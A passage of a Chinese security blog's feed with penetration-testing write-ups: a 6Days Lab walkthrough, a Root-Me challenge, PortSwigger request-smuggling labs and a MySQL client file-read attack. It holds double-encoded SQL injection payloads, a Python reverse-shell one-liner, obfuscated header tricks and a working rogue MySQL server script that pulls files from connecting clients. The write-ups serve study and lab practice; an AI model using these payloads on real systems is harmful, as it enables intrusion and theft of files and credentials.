Overall/Read”权限的用户（例如，启用了匿名用户）的特制HTTP请求，可能导致该插件的受影响版本将Jenkins凭据数据库中的凭据公开给攻击者控制的服务器。</p><p>需要下载插件：<code>https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/gitlab-plugin/1.5.11/gitlab-plugin.hpi</code></p><p>利用分析：<code>https://talosintelligence.com/vulnerability_reports/TALOS-2019-0788</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。&lt;/p&gt;
&lt;h3 id=&quot;CVE-2015-8103-反序列化远程代码执行&quot;&gt;&lt;a href=&quot;#CVE-2015-8103-反序列化远程代码执行&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>6Days Lab - v1.0.1</title>
    <link href="/2020/03/6Days-Lab-v1-0-1/"/>
    <id>/2020/03/6Days-Lab-v1-0-1/</id>
    <published>2020-03-25T07:35:02.000Z</published>
    <updated>2020-03-25T08:08:56.223Z</updated>
    
    <content type="html"><![CDATA[<p>访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png" alt="image-20200324154403672"></p><p>点击图片查看链接，发现是内网地址，估计是系统没把内网地址进行转换。</p><pre><code>http://10.66.20.100/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg</code></pre><p>不过可以通过此判断大概存在任意文件读取。再查看下面的优惠码，随便输入优惠码返回为空，但是输入单引号等会提示被IPS拦截。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153407.png" alt="image-20200324154610973"></p><p>那么这里也可能有SQL注入。</p><p>先查看上面文件读取是否可以读取到文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153409.png" alt="image-20200324154707368"></p><p>再去读取优惠码页面，里面有个sql语句的拼接。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153411.png" alt="image-20200324154744119"></p><p>再去查看config.php。发现数据库的账号密码</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153414.png" alt="image-20200324154854709"></p><p>再去尝试读取本地系统文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153415.png" alt="image-20200324155044173"></p><p>由于权限原因，是不能直接读取flag文件。尝试查找对应的目录</p><pre><code>/proc/sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid。/proc/pid/cmdline   则可以看到对应pid进程的完整命令行。</code></pre><p>在查找内网端口服务的时候，发现80端口并没有开放，也就是内网端口和外部访问端口不一致，应该是做了端口转发出来。也许可以在内网端口上直接来执行SQL注入绕过IPS。遍历端口后发现8080端口是首页地址。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153417.png" alt="image-20200324172944910"></p><p>测试双编码的情况下，可以绕过IPS，只是比在外部执行可以看到明显的返回。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153420.png" alt="image-20200324173354044"></p><p>查询得知两字段</p><pre><code>aaaa%2527union%2520select%25201,2%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153422.png" alt="image-20200325095033797"></p><p>库名，应该是需要查询<code>fancydb</code></p><pre><code>aaa%2527%2520union%2520select%2520group_concat%2528schema_name%2529%252C2%2520from%2520information_schema.schemata%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153423.png" alt="image-20200325095158899"></p><p>查表名</p><pre><code>aaa%2527%2520union%2520select%2520group_concat%2528table_name%2529%252C2%2520from%2520information_schema.tables%2520where%2520table_schema%253D0x66616e63796462%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153425.png" alt="image-20200325095533778"></p><p>字段名</p><pre><code>aaa%2527%2520union%2520select%2520group_concat%2528column_name%2529%252C2%2520from%2520information_schema.columns%2520where%2520table_name%253D%2527users%2527%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153427.png" alt="image-20200325095658267"></p><p>查询到账号密码<code>andrea:SayNoToPentests</code></p><pre><code>aaaaaa%2527%2520union%2520select%2520group_concat%2528username%252C0x3a%252Cpassword%2529%252C2%2520from%2520users%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153431.png" alt="image-20200325095818906"></p><p>尝试利用sql注入写文件，不过需要先把物理路径找到，尝试默认的apache路径<code>/var/www/html</code>，试过发现路径是如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153433.png" alt="image-20200325100055468"></p><p>尝试导出文件失败，想起来用户非root，且不具备secure_file_priv。后来想找登陆和连接入口的时候感觉这个用户名比较眼熟，才想起来用户在passwd文件中出现过。且之前尝试搜索文件的时候尝试查找了用户下面的历史命令文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153434.png" alt="image-20200325102225242"></p><p>那就直接试试ssh，确实可以登陆但是没有回显</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153437.png" alt="image-20200325102859382"></p><p>尝试反弹shell，发现是个rbash，不能这么反弹shell</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153438.png" alt="image-20200325103330806"></p><p>尝试python反弹</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>获得反弹shell，同时使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，获取原生终端</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153440.png" alt="image-20200325103553741"></p><p>目录下有个suid位文件，不过不能利用，权限不对。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153442.png" alt="image-20200325104928838"></p><p>没有历史命令文件等，不可执行sudo，查找内核漏洞，内核还不算高。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153444.png" alt="image-20200325110140941"></p><p>开启一个外网服务，下载到服务器，发现可以正常编译不报错。。。执行后获得root权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153445.png" alt="image-20200325110747898"></p><p>找到根目录下的flag文件，是一个可执行文件。执行后提示完成</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153447.png" alt="image-20200325110822459"></p><p>回过头再去看那个dog文件是啥，发现还是提示Access Denied。难道这玩意就是寻开心的？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png&quot; alt=&quot;ima
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>BBQ Factory</title>
    <link href="/2020/03/BBQ-Factory/"/>
    <id>/2020/03/BBQ-Factory/</id>
    <published>2020-03-25T07:31:57.000Z</published>
    <updated>2020-03-25T07:31:57.682Z</updated>
    
    <content type="html"><![CDATA[<p>这个并没有做完，卡在了某一点。先做记录<br>打开页面访问</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152809.png" alt="image-20200318173039025"></p><p>看到如下地址</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152814.png" alt="image-20200318173054306"></p><pre><code>http://ctf30.root-me.org//details.php?file=pdf/GROPIMP.pdf</code></pre><p>基本可以断定这是个任意文件读取。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152817.png" alt="image-20200318173231628"></p><p>现在问题是需要去读取什么文件呢。先放置，查看目录，找打一个admin目录。跳转到8080端口</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152821.png" alt="image-20200318173323249"></p><p>暂时没有爆破的欲望，继续查看，本来打算去读取一些密码，但是不知道该读取哪些文件。</p><p>尝试读取access日志，没有发现东西，想查看配置文件，比如phpmyadmin的配置文件，但是没找对目录。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152823.png" alt="image-20200318173433770"></p><p>后来在wamp的日志中找到了error日志，在日志中发现了phpmyadmin的名称。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152825.png" alt="image-20200318173214281"></p><p>phpmyadmin的密码是空密码设置，所以要是可以找到phpmyadmin的登陆地址就可以直接进去。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152827.png" alt="image-20200318173641948"></p><p>不过遗憾的是没使用phpmyadmin。准确的说是没有找到可以访问phpmyadmin的路径。检索wamp的版本</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152828.png" alt="image-20200319094207912"></p><p>现在明显的入手点就是admin页面，查看httpd.conf看看有没有目录地址，查看过后发现只有80端口一个服务。也没有虚拟站点和配置文件导入，意思是8080的端口不是wamp启动的。。。</p><p>不过随便输一个目录，在8080端口下，会报错显示一个exe文件地址。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152830.png" alt="image-20200319143027015"></p><p>下载查看，打开后发现是一个web的启动器，自动在8080端口开放。也许就是系统上8080端口服务的提供器。</p><p>丢到IDA中查看一下，也许有账号密码呢。尝试搜索Login error。找到如下信息</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152832.png" alt="image-20200319145603084"></p><p>这个信息正好是返回的响应，从里面可以看到他需要一个administration账号权限。访问下面显示的连接可以看到</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152835.png" alt="image-20200319145748709"></p><p>账号密码的来源，超上面看admin/amaBBQlova，登陆成功设置cookie：BBQOOQIE=9491b1db2da8d1efa106f013e4576b5a。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152837.png" alt="image-20200319145828589"></p><p>登陆后再去查看admin页面，貌似还需要别的？</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152838.png" alt="image-20200319151329726"></p><p>这个系统就给出了三个地址，<code>/index  /login  /admin</code>，他到底还要啥啊。。</p><p>尝试探测端口，但是稍微加点线程系统就卡住，试了半天，一个常用服务的端口都没找到。在尝试ssh的时候发现好像默认是优先公私钥登陆，所以读取到公私钥也可以访问，但是尝试几个路径都没发现公私钥。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个并没有做完，卡在了某一点。先做记录&lt;br&gt;打开页面访问&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152809.png&quot; alt=&quot;image-
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>HTTP 请求走私</title>
    <link href="/2020/03/HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>/2020/03/HTTP-请求走私/</id>
    <published>2020-03-12T02:29:20.000Z</published>
    <updated>2020-03-12T04:09:36.846Z</updated>
    
    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理有两篇文章写的十分详细，此处不在过多陈述。</p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>登陆访问即可，看到实验室说明，只需要后端收到GPOST的请求方法即可。</p><p><img src="/images/2020/03/12/8145cce0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200311170411457.png"></p><p>通过要求可以得知这是一个前端CL，后端TE的方式。先关闭burp的自动更新content-length的设置，然后修改为6字节，先发送一个请求，这个请求先不需要管。</p><p><img src="/images/2020/03/12/89e63470-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200311170700419.png"></p><p>再发送一个POST请求，就会显示这次实验的需求，GPOST方法。</p><p><img src="/images/2020/03/12/8e8007e0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200311170830800.png"></p><pre><code>前端发送数据的时候，实验content-length来设置请求的长度，后端使用transfer-encoding来处理消息。在cl和te的模式中。默认是优先使用te。前端认为POST / HTTP/1.1Content-Length: 6Transfer-Encodin: chunkedxxxxxx0G以上为一个请求,参数长度受content-length控制。而后端接收te的模式，默认这个是一个分块请求POST / HTTP/1.1Content-Length: 6Transfer-Encodin: chunkedxxxxxx0-------------------------到此，后端认为是一个请求，而G作为下一个请求而等待G这时候再进来的请求，就会作为继续未完成的请求而连接GPOST / HTTP/1.1</code></pre><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>访问实验室，查看需求，由于说明中已经告诉我们是一个te-cl的方式。</p><p><img src="/images/2020/03/12/936b7dc0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312091318601.png"></p><p>构造transfer-encoding块，其中12代表0之前的字符串长度包括换行符，长度为16，十六进制就是12。最后面的0需要跟两个换行符，缺少的话会提示Invalid request。可能构造成功后，发送几次仍然显示Missing parameter，多试几次即可。</p><p><img src="/images/2020/03/12/97473150-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312095612846.png"></p><pre><code>前端服务器使用TE块来区分。参数中12GPOST / HTTP/1.10都被认为是一个合法的块消息。而后端服务器处理中只使用CL来划分消息。导致在请求中的content-length: 4让后端服务器认为：12--------------------消息到此为一个消息GPOST / HTTP/1.10--------------------第二个请求消息从而达到请求走私的目的</code></pre><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>此种方式是前后端服务器都支持并且默认使用te块，使用某种方式导致一端不识别te块来达到，cl-te或者te-cl的方式。</p><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p>同样是用后端服务器识别到GPOST请求方法。</p><p><img src="/images/2020/03/12/9c08ff20-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312101007186.png"></p><p>构造混淆的te头的常用方式：</p><pre><code>1. Transfer-Encoding: xchunked2. Transfer-Encoding : chunked3. Transfer-Encoding: chunked   Transfer-Encoding: x4. Transfer-Encoding:[tab]chunked5. [space]Transfer-Encoding: chunked6. X: X[\n]Transfer-Encoding: chunked7. Transfer-Encoding   : chunked</code></pre><p>请求了多次后发现，一直提示缺少参数。</p><p><img src="/images/2020/03/12/a12f8230-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312102005572.png"></p><p>构造错误的te块，提示无效请求，说明前端服务器很可能是te。</p><p><img src="/images/2020/03/12/a589dba0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312102105557.png"></p><p>重新使用以上提到的方式来尝试混淆te，尝试了几种方式，发现只有双写的情况下，可以混淆后端对te的处理。</p><p><img src="/images/2020/03/12/aa4bd080-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200312102617950.png"></p><p>也就是说前端服务器处理te块消息使用了第一个te头来当作标准解析，而后端服务器中使用了第二个te头来当作标准解析。</p><h3 id="请求走私利用"><a href="#请求走私利用" class="headerlink" title="请求走私利用"></a>请求走私利用</h3><p>上面几种情况说明了请求走私的利用方式，现在同样利用实验室来尝试一下请求走私能获取到什么。</p><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p><h4 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>利用CL-TE漏洞方式，来访问前端服务器不能访问的/admin页面。同时删除carlos用户。</p><p><img src="/images/2020/03/12/1f1b2700-6417-11ea-8626-838e679dac65.png" alt="image20200312103959649.png"></p><p>尝试直接访问的时候提示页面不能访问，然后修改为cl-te的方式</p><p><img src="/images/2020/03/12/25645820-6417-11ea-8626-838e679dac65.png" alt="image20200312104623997.png"></p><p>多发送两次会发现提示</p><p><img src="/images/2020/03/12/2881ebd0-6417-11ea-8626-838e679dac65.png" alt="image20200312105204438.png"></p><p>添加localhost头。多发送几次就可以看到需要删除的用户。</p><p><img src="/images/2020/03/12/2be9f600-6417-11ea-8626-838e679dac65.png" alt="image20200312105326207.png"></p><p>构造删除的地址来发送，提示跳转302</p><p><img src="/images/2020/03/12/304a9100-6417-11ea-8626-838e679dac65.png" alt="image20200312105432606.png"></p><p>再次查看页面发送用户被删除</p><p><img src="/images/2020/03/12/34349c70-6417-11ea-8626-838e679dac65.png" alt="image20200312105610334.png"></p><h4 id="TE-TE-1"><a href="#TE-TE-1" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>第二个是利用TE-CL的方式来删除用户，同样尝试一下</p><p>实验室: <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p><p><img src="/images/2020/03/12/39cfda50-6417-11ea-8626-838e679dac65.png" alt="image20200312105739571.png"></p><p>流程基本一致，还是需要添加localhost头</p><p><img src="/images/2020/03/12/3d1fc8a0-6417-11ea-8626-838e679dac65.png" alt="image20200312110053887.png"></p><p>查看到admin页面</p><p><img src="/images/2020/03/12/4176edc0-6417-11ea-8626-838e679dac65.png" alt="image20200312110217775.png"></p><p>执行删除用户，查看已删除。</p><p><img src="/images/2020/03/12/46effda0-6417-11ea-8626-838e679dac65.png" alt="image20200312110345830.png"></p><h4 id="请求走私重写请求"><a href="#请求走私重写请求" class="headerlink" title="请求走私重写请求"></a>请求走私重写请求</h4><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p><p>利用请求走私来达到访问/admin页面，但是需要添加请求头，类似xff头，但不是xff头，然后再去删除用户。</p><p><img src="/images/2020/03/12/5891cdf0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312111010862.png"></p><p>实验室有个搜索功能，说明这个功能可能帮助我们获得需要的请求头。先访问admin页面</p><p><img src="/images/2020/03/12/60894b50-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312112425807.png"></p><p>再尝试走私请求来访问搜索，尝试了多次，添加头后终于看到了需要的请求头。而content-length的大小关系泄露出来的多少有关。</p><p><img src="/images/2020/03/12/65edc1c0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312113305960.png"></p><p>查看到了熟悉的用户页面</p><p><img src="/images/2020/03/12/6be3a2c0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312113552192.png"></p><p>不过删除过程中发现，如果还按照之前的方式来删除用户，会不能删除，多次尝试后发现提示不允许换行符。</p><p><img src="/images/2020/03/12/7016c520-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312114635935.png"></p><p>重新尝试发现使用GET方法来删除即可</p><p><img src="/images/2020/03/12/75631fb0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312114612255.png"></p><h4 id="获取其他用户cookie"><a href="#获取其他用户cookie" class="headerlink" title="获取其他用户cookie"></a>获取其他用户cookie</h4><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p><p>这个实验一开始并没有get到点，查看解后才发现原来忽略了长度。</p><p>我们提交请求的时候，受害者也会提交请求，就是需要获取并显示受害者的请求来达到获取cookie的目的。</p><p><img src="/images/2020/03/12/7b736680-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312115112213.png"></p><p>提交请求后显示跳转地址</p><p><img src="/images/2020/03/12/7f3fb0c0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312115922944.png"></p><p>查看页面的显示，从而获取用户的请求cookie</p><p><img src="/images/2020/03/12/83413bd0-6416-11ea-ac1a-19f07685b6f0.png" alt="image20200312115952305.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;原理有两篇文章写的十分详细，此处不在过多陈述。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-se
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>MySQL客户端任意文件读取</title>
    <link href="/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>/2020/01/MySQL客户端任意文件读取/</id>
    <published>2020-01-20T06:15:08.000Z</published>
    <updated>2020-01-20T06:15:08.138Z</updated>
    
    <content type="html"><![CDATA[<p>最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。</p><p><a href="https://lorexxar.cn/2020/01/14/css-mysql-chain" target="_blank" rel="noopener">https://lorexxar.cn/2020/01/14/css-mysql-chain</a></p><h3 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a><strong>LOAD DATA INFILE</strong></h3><p>LOAD DATA INFILE，作用是可以把文件读入到数据库的某个表里，如果在远程连接状态下使用了LOCAL关键字，即LOAD DATE LOCAL INFILE,那么就会从客户端读取一个本地文件，存入服务器端的table里。</p><p>如果执行<code>load data infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code>提示</p><p><img src="/images/2020/01/20/e5325b10-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119151353641.png"></p><p>受到<code>secure_file_priv</code>的导入导出限制。</p><p>但是使用<code>load data local infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code></p><p>就会把客户端的文件读取到服务端，并且不再受到<code>secure_file_priv</code>的导入导出限制。</p><p><img src="/images/2020/01/20/f1b88850-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162253456.png"></p><p>也就是说只要我们伪造一个服务端，让客户端主动连接过来，这样我们就可以任意读取系统上的文件等。</p><h3 id="请求协议分析"><a href="#请求协议分析" class="headerlink" title="请求协议分析"></a>请求协议分析</h3><h4 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h4><p>先发送一个Greeting请求包，获取一些server信息。</p><p><img src="/images/2020/01/20/f8566920-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162658492.png"></p><p>接着会发送一个认证请求包，包含账号密码</p><p><img src="/images/2020/01/20/fc5c6100-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162740414.png"></p><p>后面会再接着发送一些查询请求，获取一些设置和编码信息等。</p><p><img src="/images/2020/01/20/031061e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162840532.png"></p><h4 id="加载文件"><a href="#加载文件" class="headerlink" title="加载文件"></a>加载文件</h4><p>这时候我们点加载本地文件到test数据库中，会有三条相关的请求。第一条是发送查询语句</p><p><img src="/images/2020/01/20/0767ae10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162935498.png"></p><p>第二条是服务端返回了加载的文件地址给客户端</p><p><img src="/images/2020/01/20/0b95ee70-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163231329.png"></p><p>第三条就是客户端根据返回的地址读取文件，发送给服务端</p><p><img src="/images/2020/01/20/1063ca30-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163522298.png"></p><p>所以这相当于一个客户端根据服务端的返回来读取文件请求给服务端的过程，也就是服务端是一直可信的。</p><p>而此处的利用就是，当服务端不可信的时候，利用返回来读取连接的客户端的信息文件。</p><p>那么，是不是只有在加载LOAD DATA LOCAL的时候才可以进行读取客户端文件，而别的时候不行呢。官方有一句这么解释，此处翻译为中文</p><p><img src="/images/2020/01/20/140e3490-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163953396.png"></p><p><strong>意思是可以在任何语句中返回具有读取权限的文件</strong>。</p><h3 id="受影响应用"><a href="#受影响应用" class="headerlink" title="受影响应用"></a>受影响应用</h3><p>server端使用如下脚本：</p><pre><code>#coding=utf-8 import socketimport logginglogging.basicConfig(level=logging.DEBUG)filename=&quot;C:\\Windows\\win.ini&quot;sv=socket.socket()sv.bind((&quot;&quot;,3306))sv.listen(5)conn,address=sv.accept()logging.info(&#39;Conn from: %r&#39;, address)conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)conn.recv(9999)logging.info(&quot;auth okay&quot;)conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)conn.recv(9999)logging.info(&quot;want file...&quot;)wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filenameconn.sendall(wantfile)content=conn.recv(9999)logging.info(content)conn.close()</code></pre><p>利用Navicat Premium来连接，在配置中点击测试连接，就会有返回响应</p><p><img src="/images/2020/01/20/195f4a10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171211299.png"></p><p>python2的MySQLdb</p><p><img src="/images/2020/01/20/1d4bed90-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171833747.png"></p><p>不过在测试中发现python3的pymysql确不受影响</p><p><img src="/images/2020/01/20/214ba3e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119172212466.png"></p><h3 id="拓展利用"><a href="#拓展利用" class="headerlink" title="拓展利用"></a>拓展利用</h3><p>在原文中，讲述了几种针对CMS的利用，那么就看一种针对dedecms的简单利用方式。</p><pre><code>load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table dede_log FIELDS TERMINATED BY &#39;\n&#39;;</code></pre><p><img src="/images/2020/01/20/26688a00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120135559523.png"></p><pre><code>select * from dede_log;</code></pre><p>使用dede默认的数据库的时候，连接信息被隐藏没有保存到数据。</p><p><img src="/images/2020/01/20/2bc49c00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140154255.png"></p><p>先更改数据库</p><pre><code>use test;load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table test.test FIELDS TERMINATED BY &#39;\n&#39;;select * from test.test;</code></pre><p><img src="/images/2020/01/20/315aa9c0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140411574.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://l
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Kafka</title>
    <link href="/2020/01/Kafka/"/>
    <id>/2020/01/Kafka/</id>
    <published>2020-01-14T08:05:55.000Z</published>
    <updated>2020-01-16T08:16:55.346Z</updated>
    
